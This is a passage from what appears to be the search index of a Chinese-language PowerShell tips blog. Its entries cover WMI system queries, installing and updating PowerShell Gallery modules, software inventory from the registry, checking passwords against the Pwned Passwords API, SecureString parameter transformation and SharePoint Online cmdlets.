System.Management.Automation.ValidateArgumentsAttribute{ # the value to be checked surfaces in $path and must be of type [object] [void]Validate([object]$path, [System.Management.Automation.EngineIntrinsics]$engineIntrinsics) { # if anything is wrong with the value, throw an exception if([string]::IsNullOrWhiteSpace($path)) { Throw [System.ArgumentNullException]::new() } if(-not (Test-Path -Path $path)) { Throw [System.IO.FileNotFoundException]::new() } # if NO exception was thrown, the value is accepted }}#endregion[ValidatePathExists()][string]$Path = &quot;c:\\windows&quot;$Path = &quot;c:\\test123&quot; 当您分配不存在的路径时，PowerShell都将不分配它，而是保留现有值。","link":"/2020/04/24/using-custom-validation-attributes/"},{"title":"PowerShell 技能连载 - 管理自动重启","text":"当 Windows 系统崩溃时，通常会立即重新启动。这称为“自动重置功能”，使用此此行代码即可检查您的计算机是否支持此功能： 1Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -Property Name, AutomaticResetCapability 系统是否实际执行自动重启由“AutomaticResetBootOption”控制： 1Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -Property Name, AutomaticResetBootOption If you own Administrator privileges, you can even change this setting. To turn off automatic reset booting, run this:如果您拥有管理员特权，甚至可以更改此设置。要关闭自动重置启动，请运行以下命令： 1Set-CimInstance -Query 'Select * From Win32_ComputerSystem' -Property @{AutomaticResetBootOption=$false} 有关 WMI 类 Win32_ComputerSystem 的更多信息，请访问http://powershell.one/wmi/root/cimv2/win32_computersystem。","link":"/2020/04/28/managing-automatic-reset/"},{"title":"PowerShell 技能连载 - 读取机箱的 SKU","text":"在 Windows 10 和 Server 2016中，WMI 添加了一个新属性，该属性简化了机箱或机壳 SKU 的收集。以下这行代码能够读取 SKU： 12345PS&gt; Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -Property Name, ChassisSKUNumberName ChassisSKUNumber---- ----------------DESKTOP-8DVNI43 Convertible SKU 编号仅仅是通用的“可替换编号”（对于笔记本电脑）还是一个独立的编号，取决于制造商和 BIOS 设置。 一个更有希望的类是 Win32_SystemEnclosure，它存在于所有 Windows 版本中： 12345PS&gt; Get-CimInstance -ClassName Win32_SystemEnclosure | Select-Object -Property Manufacturer, SerialNumber, LockPresentManufacturer SerialNumber LockPresent------------ ------------ -----------Dell Inc. 4ZKM0Z2 False","link":"/2020/04/30/reading-chassis-sku/"},{"title":"PowerShell 技能连载 - 获取 WMI 对象的帮助","text":"WMI 非常强大，但文档不太够。要改变这个情况，已经成立了一个小组并正在编写用于 PowerShell 的 WMI 参考文档：https://powershell.one/wmi 为了轻松查找帮助，可以将 Help() 方法添加到所有WMI和CIM实例对象。只需运行以下代码： 123456789101112131415$codeCim = { $url = 'https://powershell.one/wmi/{0}/{1}' -f $this.CimSystemProperties.Namespace.Replace(&quot;/&quot;,&quot;\\&quot;), # add class $this.CimSystemProperties.ClassName Start-Process -FilePath $url.ToLower()}$codeWmi = { $url = 'https://powershell.one/wmi/{0}/{1}' -f $this.__Namespace, $this.__Class Start-Process -FilePath $url.ToLower()}Update-TypeData -TypeName Microsoft.Management.Infrastructure.CimInstance -MemberType ScriptMethod -MemberName Help -Value $codeCim -ForceUpdate-TypeData -TypeName System.Management.ManagementObject -MemberType ScriptMethod -MemberName Help -Value $codeWmi -Force 现在，当您从 Get-WmiObject 或 Get-CimInstance 检索信息时，每个对象都具有新的 Help() 方法，该方法会自动在浏览器中打开相应的参考页： 1234567891011PS&gt; $result = Get-WmiObject -Class Win32_SharePS&gt; $result[0].Help()PS&gt; $result.Help()PS&gt; $result = Get-CimInstance -ClassName Win32_StartupCommandPS&gt; $result.Help() 如果您想参加并获得有用的 WMI 示例代码，请转到相应的参考页面，并通过底部的注释功能添加您的代码。","link":"/2020/05/04/getting-help-for-wmi-objects/"},{"title":"PowerShell 技能连载 - 增加新的 PowerShell 命令","text":"PowerShell 只是一个脚本平台，可以增加新命令来扩展。新命令的一个很好的来源是公开的 PowerShell Gallery。您可以访问 [https://powershellgallery.com]（https://powershellgallery.com）上的图形前端，并搜索模块。 PowerShell 带有一个称为 PowerShellGet 的模块，该模块又提供了从 PowerShell 库下载和安装扩展的命令。我们现在就下载并安装免费的命令扩展程序。 当前最受欢迎的通用 PowerShell 命令扩展之一是免费的 Carbon 模块，在过去六周中下载了将近 400 万次。要从 PowerShell 库中安装它，请使用 Install-Module。使用 CurrentUser 范围时，不需要管理员权限： 1PS&gt; Install-Module -Name Carbon -Scope CurrentUser 首次使用时，Install-Module 会请求下载许可并使用 “nuget“ DLL，该 DLL 负责下载和安装过程。接下来，下载并解压缩请求的模块。由于 PowerShell 库是一个公共存储库，因此要求您同意将材料下载到计算机上。使用 -Force 参数可以跳过此部分。 重要提示：PowerShell Gallery 提供的大多数 PowerShell 模块都是基于脚本的。您需要允许执行脚本否则，您将无法使用基于脚本的模块。如果尚未允许脚本执行，则可以使用以下命令： 1PS&gt; Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -Force 要查看新的 PowerShell 命令，请列出添加的模块中包含的命令： 1PS&gt; Get-Command -Module Carbon | Out-GridView 这是一个例子： 1234567PS&gt; Get-FileShareName Path Description---- ---- -----------ADMIN$ C:\\Windows Remote AdminC$ C:\\ Default shareprint$ C:\\Windows\\system32\\spool\\drivers PrintDrivers","link":"/2020/05/06/adding-new-powershell-commands/"},{"title":"PowerShell 技能连载 - 使 PowerShell 模块保持最新","text":"务必经常检查您的 PowerShell 模块是否为最新。如果您使用的是旧的和过时的模块，则可能会遇到问题，就像平时使用旧的和过时的软件一样。 例如，PowerShellGet 模块提供了诸如 Install-Module 之类的 cmdlet，可让您轻松下载和安装其他 PowerShell 模块，并通过新的命令和功能扩展 PowerShell。 为了了解这一点，下面是一个示例，该示例下载并安装 QRCodeGenerator 模块，该模块会生成各种 QR 代码，例如用于 Twitter 个人资料： 12345# install new PowerShell module from PowerShell GalleryPS&gt; Install-Module -Name QRCodeGenerator -Scope CurrentUser# use one of the newly added commands to create a QR code for Twitter profilesPS&gt; New-QRCodeTwitter -ProfileName tobiaspsp -Show 使用智能手机相机扫描创建的 QR 码时，您可以访问 QR 码中编码的 Twitter 个人资料。同样，其他 QR 码类型也可以提供前往某个地点的路线或向您的地址簿添加联系人： 12345678PS&gt; Get-Command -Module QRCodeGenerator -CommandType functionCommandType Name Version Source----------- ---- ------- ------Function New-PSOneQRCodeGeolocation 2.2 QRCodeGeneratorFunction New-PSOneQRCodeTwitter 2.2 QRCodeGeneratorFunction New-PSOneQRCodeVCard 2.2 QRCodeGeneratorFunction New-PSOneQRCodeWifiAccess 2.2 QRCodeGenerator 如果您在新添加的模块上遇到问题，则可能是因为 PowerShellGet 模块已过时。如果您仍在使用古老的 PowerShellGet 版本 1.0.0.1，则可能会遇到讨厌的错误。 当模块仅使用 manifest 文件中的 major 和 minor 版本号时，Install-Module 会将它们安装到具有 3 位数字版本号的子文件夹中。这使已安装的模块不可用。 因此，保持模块最新很重要。PowerShellGet 的最新版本已修复此错误。让我们看一下如何检查和更新模块。 首先，找出您当前使用的模块版本，例如 PowerShellGet： 12345678910PS&gt; Get-Module -Name PowerShellGet -ListAvailable Directory: C:\\Program Files\\WindowsPowerShell\\ModulesModuleType Version Name ExportedCommands---------- ------- ---- ----------------Script 2.2.1 PowerShellGet {Find-Command, Find-DSCResource, Find-Module...}Script 1.0.0.1 PowerShellGet {Install-Module, Find-Module, Save-Module...} 在此示例中，安装了两个不同版本的 PowerShellGet模块：初始发行版本1.0.0.1和更新版本2.2.1。要找出您使用的版本，请尝试以下操作： 1234567PS&gt; Import-Module -Name PowerShellGetPS&gt; Get-Module -Name PowerShellGetModuleType Version Name ExportedCommands---------- ------- ---- ----------------Script 2.2.1 PowerShellGet {Find-Command, Find-DscResource, Find-Module...} 接下来，检查是否有可用的较新版本（这要求该模块通过官方 PowerShell 库提供，但并非对所有模块都适用。如果此处未提供您的模块，则需要检查最初提供该模块的实体）： 12345PS&gt; Find-Module -Name PowerShellGetVersion Name Repository Description------- ---- ---------- -----------2.2.3 PowerShellGet PSGallery PowerShell module with commands for discovering, installing, upd... 如果有较新的版本，请先尝试更新模块： 12345678910111213141516171819PS&gt; Update-Module -Name PowerShellGetPS&gt; Get-Module -Name PowerShellGet -ListAvailable Directory: C:\\Users\\tobia\\OneDrive\\Dokumente\\WindowsPowerShell\\ModulesModuleType Version Name ExportedCommands---------- ------- ---- -----------Script 2.2.3 PowerShellGet {Find-Command, Find-DSCResource, Find-M...} Directory: C:\\Program Files\\WindowsPowerShell\\ModulesModuleType Version Name ExportedCommands---------- ------- ---- ----------------Script 2.2.1 PowerShellGet {Find-Command, Find-DSCResource, Find-M...}Script 1.0.0.1 PowerShellGet {Install-Module, Find-Module, Save-M...} Update-Module 要求该模块最初是通过 Install-Module 安装的。如果是这样，PowerShell 会知道原始源码库并自动更新该模块。 如果 Update-Module 失败，请尝试使用 -Force 参数重新安装该模块。如果仍然失败，请添加 -SkipPublisherCheck 参数： 1PS&gt; Install-Module -Name PowerShellGet -Scope CurrentUser -Force -SkipPublisherCheck 要验证成功，请确保已加载最新版本： 12345PS&gt; Import-Module -Name PowerShellGet -Force -PassThruModuleType Version Name ExportedCommands---------- ------- ---- ----------------Script 2.2.3 PowerShellGet {Find-Command, Find-DscResource, Find-Mo...","link":"/2020/05/08/keep-powershell-modules-up-to-date/"},{"title":"PowerShell 技能连载 - 创建软件库","text":"Windows 注册表存储已安装的所有软件的名称和详细信息。PowerShell 可以读取该信息，并为您提供完整的软件清单： 123456789101112# read all child keys (*) from all four locations and do not emit# errors if one of these keys does not existGet-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*', 'HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*', 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*', 'HKCU:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' -ErrorAction Ignore |# list only items with the DisplayNameWhere-Object DisplayName |# show these registry values per itemSelect-Object -Property DisplayName, DisplayVersion, UninstallString, InstallDate |# sort by DisplayNameSort-Object -Property DisplayName 如果您想添加更多信息（例如，软件是 32 位还是 64 位），或者要将代码转换为可重用的新 PowerShell 命令，请在此处阅读更多内容：https://powershell.one/code/5.html。","link":"/2020/05/12/create-software-inventories/"},{"title":"PowerShell 技能连载 - 检测泄露的密码（第 1 部分）","text":"密码复杂时也不一定是安全的。相反，您需要确保密码没有受到破坏，并且不在默认的攻击者词典中。如果自动攻击经常检查该密码，那么即使是最复杂的密码也不安全。 要确定密码是否被泄露，请使用以下功能： 123456789101112131415161718192021222324252627282930313233343536373839function Test-Password{ [CmdletBinding()] param ( [Parameter(Mandatory, Position=0)] [System.Security.SecureString] $Password ) # take securestring and get the entered plain text password # we are using a securestring only to get a masked input box $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Password) $plain = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR) # hash the password $bytes = [Text.Encoding]::UTF8.GetBytes($plain) $stream = [IO.MemoryStream]::new($bytes) $hash = Get-FileHash -Algorithm 'SHA1' -InputStream $stream $stream.Close() $stream.Dispose() # separate the first 5 hash characters from the rest $first5hashChars,$remainingHashChars = $hash.Hash -split '(?&lt;=^.{5})' # send the first 5 hash characters to the web service $url = &quot;https://api.pwnedpasswords.com/range/$first5hashChars&quot; [Net.ServicePointManager]::SecurityProtocol = 'Tls12' $response = Invoke-RestMethod -Uri $url -UseBasicParsing # split result into individual lines... $lines = $response -split '\\r\\n' # ...and get the line where the returned hash matches your # remainder of the hash that you kept private $filteredLines = $lines -like &quot;$remainingHashChars*&quot; # return the number of compromises [int]($filteredLines -split ':')[-1]} 使用起来非常简单：只需将密码传给 Test-Password 函数即可。它返回已知泄露的数量，并且返回大于 0 泄露的任何密码都被认为是不安全的，必须进行更改。 1234PS&gt; $password = Read-Host -AsSecureStringPS&gt; Test-Password -Password $password4880 密码必须作为 SecureString 提交。您可以不带密码运行 Test-Password，在这种情况下，系统会提示您。或者您需要以 SecureString 形式读取密码。 在该示例中，复杂密码 “P@$$w0rd” 在 4880 次攻击中被泄露，使用起来非常不安全。","link":"/2020/05/14/identifying-compromised-passwords-part-1/"},{"title":"PowerShell 技能连载 - 检测泄露的密码（第 2 部分）","text":"当您想向 PowerShell 函数提交敏感信息时，通常使用 SecureString 类型。这种类型可确保用户通过一个带遮罩的对话框输入数据，这样能保护输入内容免受不会被旁人看到。 由于 SecureString 始终可以由创建 SecureString 的人解密为纯文本，因此您可以利用带的输入框，但仍可以使用输入的纯文本： 1234567891011121314151617function Test-Password{ [CmdletBinding()] param ( [Parameter(Mandatory, Position=0)] [System.Security.SecureString] $Password ) # take a SecureString and get the entered plain text password # we are using a SecureString only to get a masked input box $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Password) $plain = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR) &quot;You entered: $plain&quot;} 当您运行代码然后运行 Test-Password 时，系统会提示您带有遮罩的输入。在函数内部，会将提交的 SecureString 解密为纯文本。 但是，这种方法有一个明显的缺点：如果希望通过参数传入信息，则现在必须提交 SecureString。您不能再传入纯文本： 1234567# fails:PS&gt; Test-Password -Password testTest-Password : Cannot process argument transformation on parameter 'Password'. Cannot convert the &quot;test&quot; value of type &quot;System.String&quot; to type &quot;System.Security.SecureString&quot;.# worksPS&gt; Test-Password -Password (&quot;test&quot; | ConvertTo-SecureString -AsPlainText -Force)You entered: test 不过，使用自定义属性，您可以为任何参数添加自动功能，以将纯文本自动转换为 SecureString： 12345678910111213141516171819202122232425262728# create a transform attribute that transforms plain text to a SecureStringclass SecureStringTransformAttribute : System.Management.Automation.ArgumentTransformationAttribute{ [object] Transform([System.Management.Automation.EngineIntrinsics]$engineIntrinsics, [object] $inputData) { if ($inputData -is [SecureString]) { return $inputData } elseif ($inputData -is [string]) { return $inputData | ConvertTo-SecureString -AsPlainText -Force } throw &quot;Unexpected Error.&quot; }}function Test-Password{ [CmdletBinding()] param ( [Parameter(Mandatory, Position=0)] [System.Security.SecureString] [SecureStringTransform()] $Password ) # take a SecureString and get the entered plain text password # we are using a SecureString only to get a masked input box $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Password) $plain = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR) &quot;You entered: $plain&quot;} 现在，用户可以在不使用参数的情况下运行 Test-Password，并获得带掩码对话框的提示。用户还可以直接传入纯文本： 12345678910# use built-in masked inputPS&gt; Test-Passwordcmdlet Test-Password at command pipeline position 1Supply values for the following parameters:Password: ******You entered: secret# use text-to-SecureString transformation attributePS&gt; Test-Password -Password secretYou entered: secret 如果您想了解转换属性的工作原理，请查看以下详细信息：https://powershell.one/powershell-internals/attributes/transformation","link":"/2020/05/18/identifying-compromised-passwords-part-2/"},{"title":"PowerShell 技能连载 - 管理 SharePoint Online","text":"如果您使用 SharePoint Online，并希望通过 PowerShell 对其进行管理，请从 PowerShell Gallery 中下载并安装 Microsoft.Online.SharePoint.PowerShell 模块： 123456789# search for the module in PowerShell Gallery (optional)PS&gt; Find-Module -Name Microsoft.Online.SharePoint.PowerShellVersion Name Repository Description------- ---- ---------- --------16.0.19927.12000 Microsoft.Online.SharePoint.Powe... PSGallery Microsoft SharePoint Online# install the module in your personal scope (no admin privileges required)PS&gt; Install-Module -Name Microsoft.Online.SharePoint.PowerShell -Repository PSGallery -Scope CurrentUser 现在，您可以使用大量新的 PowerShell cmdlet 来管理 SharePoint Online： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364PS&gt; Get-Command -Module Microsoft.Online.SharePoint.PowerShell | Format-Wide -Column 3Add-SPOGeoAdministrator Add-SPOHubSiteAssociation Add-SPOHubToHubAssocia...Add-SPOOrgAssetsLibrary Add-SPOSiteCollectionAp... Add-SPOSiteDesignAdd-SPOSiteDesignTask Add-SPOSiteScript Add-SPOSiteScriptPackageAdd-SPOTenantCdnOrigin Add-SPOTheme Add-SPOUserApprove-SPOTenantServic... Approve-SPOTenantServic... Connect-SPOServiceConvertTo-SPOMigrationE... ConvertTo-SPOMigrationT... Deny-SPOTenantServiceP...Disable-SPOTenantServic... Disconnect-SPOService Enable-SPOCommSiteEnable-SPOTenantService... Export-SPOQueryLogs Export-SPOUserInfoExport-SPOUserProfile Get-SPOAppErrors Get-SPOAppInfoGet-SPOBrowserIdleSignOut Get-SPOBuiltInDesignPac... Get-SPOCrossGeoMovedUsersGet-SPOCrossGeoMoveReport Get-SPOCrossGeoUsers Get-SPODataEncryptionP...Get-SPODeletedSite Get-SPOExternalUser Get-SPOGeoAdministratorGet-SPOGeoMoveCrossComp... Get-SPOGeoStorageQuota Get-SPOHideDefaultThemesGet-SPOHomeSite Get-SPOHubSite Get-SPOKnowledgeHubSiteGet-SPOMigrationJobProg... Get-SPOMigrationJobStatus Get-SPOMultiGeoCompany...Get-SPOMultiGeoExperience Get-SPOOrgAssetsLibrary Get-SPOOrgNewsSiteGet-SPOPublicCdnOrigins Get-SPOSite Get-SPOSiteCollectionA...Get-SPOSiteContentMoveS... Get-SPOSiteDataEncrypti... Get-SPOSiteDesignGet-SPOSiteDesignRights Get-SPOSiteDesignRun Get-SPOSiteDesignRunSt...Get-SPOSiteDesignTask Get-SPOSiteGroup Get-SPOSiteRenameStateGet-SPOSiteScript Get-SPOSiteScriptFromList Get-SPOSiteScriptFromWebGet-SPOSiteUserInvitations Get-SPOStorageEntity Get-SPOStructuralNavig...Get-SPOStructuralNaviga... Get-SPOTenant Get-SPOTenantCdnEnabledGet-SPOTenantCdnOrigins Get-SPOTenantCdnPolicies Get-SPOTenantContentTy...Get-SPOTenantLogEntry Get-SPOTenantLogLastAva... Get-SPOTenantOrgRelationGet-SPOTenantOrgRelatio... Get-SPOTenantOrgRelatio... Get-SPOTenantServicePr...Get-SPOTenantServicePri... Get-SPOTenantSyncClient... Get-SPOTenantTaxonomyR...Get-SPOTheme Get-SPOUnifiedGroup Get-SPOUnifiedGroupMov...Get-SPOUser Get-SPOUserAndContentMo... Get-SPOUserOneDriveLoc...Get-SPOWebTemplate Grant-SPOHubSiteRights Grant-SPOSiteDesignRightsInvoke-SPOMigrationEncr... Invoke-SPOSiteDesign Invoke-SPOSiteSwapNew-SPOMigrationEncrypt... New-SPOMigrationPackage New-SPOPublicCdnOriginNew-SPOSdnProvider New-SPOSite New-SPOSiteGroupNew-SPOTenantOrgRelation Register-SPODataEncrypt... Register-SPOHubSiteRemove-SPODeletedSite Remove-SPOExternalUser Remove-SPOGeoAdministr...Remove-SPOHomeSite Remove-SPOHubSiteAssoci... Remove-SPOHubToHubAsso...Remove-SPOKnowledgeHubSite Remove-SPOMigrationJob Remove-SPOMultiGeoComp...Remove-SPOOrgAssetsLibrary Remove-SPOOrgNewsSite Remove-SPOPublicCdnOriginRemove-SPOSdnProvider Remove-SPOSite Remove-SPOSiteCollecti...Remove-SPOSiteCollectio... Remove-SPOSiteDesign Remove-SPOSiteDesignTaskRemove-SPOSiteGroup Remove-SPOSiteScript Remove-SPOSiteUserInvi...Remove-SPOStorageEntity Remove-SPOTenantCdnOrigin Remove-SPOTenantOrgRel...Remove-SPOTenantSyncCli... Remove-SPOTheme Remove-SPOUserRemove-SPOUserInfo Remove-SPOUserProfile Repair-SPOSiteRequest-SPOPersonalSite Request-SPOUpgradeEvalu... Restore-SPODataEncrypt...Restore-SPODeletedSite Revoke-SPOHubSiteRights Revoke-SPOSiteDesignRi...Revoke-SPOTenantService... Revoke-SPOUserSession Set-SPOBrowserIdleSignOutSet-SPOBuiltInDesignPac... Set-SPOGeoStorageQuota Set-SPOHideDefaultThemesSet-SPOHomeSite Set-SPOHubSite Set-SPOKnowledgeHubSiteSet-SPOMigrationPackage... Set-SPOMultiGeoCompanyA... Set-SPOMultiGeoExperienceSet-SPOOrgAssetsLibrary Set-SPOOrgNewsSite Set-SPOSiteSet-SPOSiteDesign Set-SPOSiteGroup Set-SPOSiteOffice365GroupSet-SPOSiteScript Set-SPOSiteScriptPackage Set-SPOStorageEntitySet-SPOStructuralNaviga... Set-SPOStructuralNaviga... Set-SPOTenantSet-SPOTenantCdnEnabled Set-SPOTenantCdnPolicy Set-SPOTenantContentTy...Set-SPOTenantSyncClient... Set-SPOTenantTaxonomyRe... Set-SPOUnifiedGroupSet-SPOUser Set-SPOWebTheme Start-SPOSiteContentMoveStart-SPOSiteRename Start-SPOUnifiedGroupMove Start-SPOUserAndConten...Stop-SPOSiteContentMove Stop-SPOUserAndContentMove Submit-SPOMigrationJobTest-SPOSite Unregister-SPOHubSite Update-SPODataEncrypti...Update-UserType Upgrade-SPOSite Verify-SPOTenantOrgRel... 第一步总是从 Connect-SPOService 开始，连接到SharePoint Online： 1Get-Help -Name Connect-SPOService -ShowWindow 接下来，使用查找动词为 Get 的 cmdlet这将安全地提供大量信息，但不会更改任何设置，也不会损坏任何东西： 123456789101112131415161718192021222324PS&gt; Get-Command -Verb Get -Module Microsoft.Online.SharePoint.PowerShell | Format-Wide -Column 3Get-SPOAppErrors Get-SPOAppInfo Get-SPOBrowserIdleSignOutGet-SPOBuiltInDesignPack... Get-SPOCrossGeoMovedUsers Get-SPOCrossGeoMoveReportGet-SPOCrossGeoUsers Get-SPODataEncryptionPolicy Get-SPODeletedSiteGet-SPOExternalUser Get-SPOGeoAdministrator Get-SPOGeoMoveCrossComp...Get-SPOGeoStorageQuota Get-SPOHideDefaultThemes Get-SPOHomeSiteGet-SPOHubSite Get-SPOKnowledgeHubSite Get-SPOMigrationJobProg...Get-SPOMigrationJobStatus Get-SPOMultiGeoCompanyAl... Get-SPOMultiGeoExperienceGet-SPOOrgAssetsLibrary Get-SPOOrgNewsSite Get-SPOPublicCdnOriginsGet-SPOSite Get-SPOSiteCollectionApp... Get-SPOSiteContentMoveS...Get-SPOSiteDataEncryptio... Get-SPOSiteDesign Get-SPOSiteDesignRightsGet-SPOSiteDesignRun Get-SPOSiteDesignRunStatus Get-SPOSiteDesignTaskGet-SPOSiteGroup Get-SPOSiteRenameState Get-SPOSiteScriptGet-SPOSiteScriptFromList Get-SPOSiteScriptFromWeb Get-SPOSiteUserInvitationsGet-SPOStorageEntity Get-SPOStructuralNavigat... Get-SPOStructuralNaviga...Get-SPOTenant Get-SPOTenantCdnEnabled Get-SPOTenantCdnOriginsGet-SPOTenantCdnPolicies Get-SPOTenantContentType... Get-SPOTenantLogEntryGet-SPOTenantLogLastAvai... Get-SPOTenantOrgRelation Get-SPOTenantOrgRelatio...Get-SPOTenantOrgRelation... Get-SPOTenantServicePrin... Get-SPOTenantServicePri...Get-SPOTenantSyncClientR... Get-SPOTenantTaxonomyRep... Get-SPOThemeGet-SPOUnifiedGroup Get-SPOUnifiedGroupMoveS... Get-SPOUserGet-SPOUserAndContentMov... Get-SPOUserOneDriveLocation Get-SPOWebTemplate 当您适应了以后，可以接着查看更改和管理 SharePoint 的其余 cmdlet： 1234567891011121314151617181920212223242526272829303132PS&gt; Get-Command -Module Microsoft.Online.SharePoint.PowerShell | Group-Object Verb -NoElement | Sort-Object Count -DescCount Name----- ---- 63 Get 30 Set 29 Remove 12 Add 7 New 4 Start 4 Revoke 3 Export 3 Invoke 2 Update 2 Stop 2 Restore 2 Request 2 Register 2 Grant 2 Enable 2 ConvertTo 2 Approve 1 Repair 1 Disconnect 1 Disable 1 Deny 1 Connect 1 Submit 1 Test 1 Unregister 1 Upgrade 1 Verify","link":"/2020/05/20/managing-sharepoint-online/"},{"title":"PowerShell 技能连载 - 在 PowerShell Gallery 搜索新模块","text":"官方的 PowerShell Gallery 是一个公共仓库，其中包含数千个免费的 PowerShell 模块。无需重新设计轮子，而是完全可以浏览 gallery 以查找可重用的代码，这些代码可按原样使用或用作自己项目的起点。让我们看一下如何从 PowerShell 库中发现和下载 PowerShell 代码。 您可以在 https://powershellgallery.com 上使用其图形前端来搜索代码，但是 Find-Module cmdlet 是一种更好，更强大的方法。如果您正在寻找通过 PowerShell 管理 Office 365 的方法，可以通过下面这行代码获取包含 “Office” 关键字的所有模块： 12345678910111213141516171819202122232425262728Name CompanyName PublishedDate Description---- ----------- ------------- -----------OfficeOnlineServerDsc {PowerShellTeam, gaelcolas, dsccommunity} 03.04.2020 22:01:30 The OfficeOnlineSe...Office365DnsChecker rhymeswithmogul 30.03.2020 14:15:00 Checks a domain's ...Microsoft.Graph.DevicesApps.OfficeConfiguration msgraph-sdk-powershell 17.03.2020 01:24:39 Microsoft Graph Po...IntraOffice.ContentRepository.Powershell rderegt 06.03.2020 14:26:35 Client library for...Office365DSC NikCharleboisPFE 04.03.2020 23:13:30 This DSC module is...Office365PowershellUtils joshn-whatcomtrans.net 03.03.2020 00:26:59 A collection of cm...Office365Cmdlets CData 20.02.2020 20:13:29 CData Cmdlets for ...MSPOffice365Tools majorwitteman 13.02.2020 20:26:15 Collection of Offi...AdminToolbox.Office365 {TaylorLee, Taylor_Lee} 27.01.2020 15:26:36 Functions for work...OfficeAddinManager DarrenDK 17.12.2019 07:10:08 Module for managin...PSP-Office365 powershellpr0mpt 20.11.2019 10:57:08 Helper module to g...Office365MailAliases Cloudenius 17.11.2019 11:57:07 This module contai...Office365Toolkit PatrickJD84 03.09.2019 03:01:36 A collection of sc...Office365.Connect nicomartens 22.08.2019 07:58:43 Uses the Windows C...Office365TokenGet junecastillote 17.07.2019 03:21:07 Helps you acquire ...BitTitan.Runbooks.Office365SecurityAndCompliance.Beta BT_AutomationEngineers 14.05.2019 08:41:04 PowerShell module ...BitTitan.Runbooks.Office365SecurityAndCompliance BT_AutomationEngineers 12.03.2019 07:22:10 PowerShell module ...Office365Module Giertz 24.01.2019 22:56:08 test for ezZIM.Office365 Mikezim 14.12.2018 11:53:54 Provides a set of ...MZN.Office365 michael.zimmerman 14.12.2018 08:10:26 Provides a set of ...JumpCloud.Office365.SSO Scottd3v 14.06.2018 16:13:13 Functions to enabl...Office365GraphAPI chenxizhang 12.06.2017 15:14:57 Office 365 Graph A...Office365Connect Gonjer 18.05.2017 21:13:41 Office365Connect i...RackspaceCloudOffice {mlk, paul.trampert.rackspace} 28.09.2016 14:34:25 REST client for th...Office365 StevenAyers 16.07.2016 10:53:36 For Microsoft Part...OfficeProvider abaker 01.03.2016 21:00:35 OfficeProvider all... 该列表包括发布者和模块描述，并按从新到旧的顺序对模块进行排序。PublishedDate 列指示模块是否是最近刚添加到 gallery中，这样您可以立即查看它是否维护良好并且值得一看。 如果您发现某个特定模块有趣，请获取其所有元数据： 123456789101112131415161718192021222324252627282930313233343536373839404142PS&gt; Find-Module -Name Office365PowershellUtils -Repository PSGallery | Select-Object -Property *Name : Office365PowershellUtilsVersion : 1.1.5Type : ModuleDescription : A collection of cmdlets for managing Office365Author : R. Josh NylanderCompanyName : joshn-whatcomtrans.netCopyright : (c) 2012 WTA. All rights reserved.PublishedDate : 03.03.2020 00:26:59InstalledDate :UpdatedDate :LicenseUri :ProjectUri :IconUri :Tags : {PSModule}Includes : {Function, RoleCapability, Command, DscResource...}PowerShellGetFormatVersion :ReleaseNotes :Dependencies : {}RepositorySourceLocation : https://www.powershellgallery.com/api/v2Repository : PSGalleryPackageManagementProvider : NuGetAdditionalMetadata : @{summary=A collection of cmdlets for managing Office365; versionDownloadCount=33; ItemType=Module; copyright=(c) 2012 WTA. All rights reserved.; PackageManagementProvider=NuGet; CompanyName=Whatcom Transportation Authority; SourceName=PSGallery; tags=PSModule; created=03.03.2020 00:26:59 +01:00; description=A collection of cmdlets for managing Office365; published=03.03.2020 00:26:59 +01:00; developmentDependency=False; NormalizedVersion=1.1.5; downloadCount=296; GUID=c6b26555-2b5f-45bc-affe-ef1c31580df3; lastUpdated=02.04.2020 16:50:22 +02:00; Authors=R. Josh Nylander; updated=2020-04-02T16:50:22Z; Functions=Find-MsolUsersWithLicense Update-MsolLicensedUsersFromGroup Update-MsolUserUsageLocation Change-ProxyAddress Add-ProxyAddress Remove-ProxyAddress Set-ProxyAddress Sync-ProxyAddress Test-ProxyAddress Get-ProxyAddressDefault Enable-SecurityGroupAsDistributionGroup Disable-SecurityGroupAsDistributionGroup Start-DirSync Get-NextDirSync Suspend-UserMailbox Resume-UserMailbox Test-Mailbox Get-MailboxMemberOf Clear-MailboxMemberOf Use-Office365 Export-PSCredential Import-PSCredential; isLatestVersion=True; PowerShellVersion=3.0; IsPrerelease=false; isAbsoluteLatestVersion=True; packageSize=16635; FileList=Office3 65PowershellUtils.nuspec|Function_Connect-Office365.ps1|Office365PowershellUtils.psd1|Office365PowerShellUti ls_mod.psm1|PSCredentials.psm1|README|SampleMigrationScripts\\Monitor-MoveStats.ps1|SampleMigrationScripts\\Re sume-FirstFiveSuspended.ps1|SampleMigrationScripts\\Set-MailboxTimeZone.ps1|SampleMigrationScripts\\Set-Remote RoutingAddress.ps1|SampleMigrationScripts\\Set-RetentionPolicy.ps1|SampleMigrationScripts\\Set-RoleAssignmentP olicy.ps1; requireLicenseAcceptance=False} 如果您只对源代码感兴趣，请使用 Save-Module 并将模块下载到您选择的文件夹中： 1234567891011121314# path to source code$path = &quot;c:\\sources&quot;# name of module to investigate$moduleName = &quot;Office365PowershellUtils&quot;# create folder$null = New-Item -Path $path -ItemType Directory# download moduleSave-Module -Name $moduleName -Path $path -Repository PSGallery# open folder with sourcesexplorer (Join-Path -Path $path -ChildPath $moduleName) 如果您想按原样实际使用该模块，请改用 Install-Module： 1PS&gt; Install-Module -Name Office365PowershellUtils -Scope CurrentUser -Repository PSGallery","link":"/2020/05/22/searching-powershell-gallery-for-new-modules/"},{"title":"PowerShell 技能连载 - 在控制台中提示输入凭据","text":"当您运行 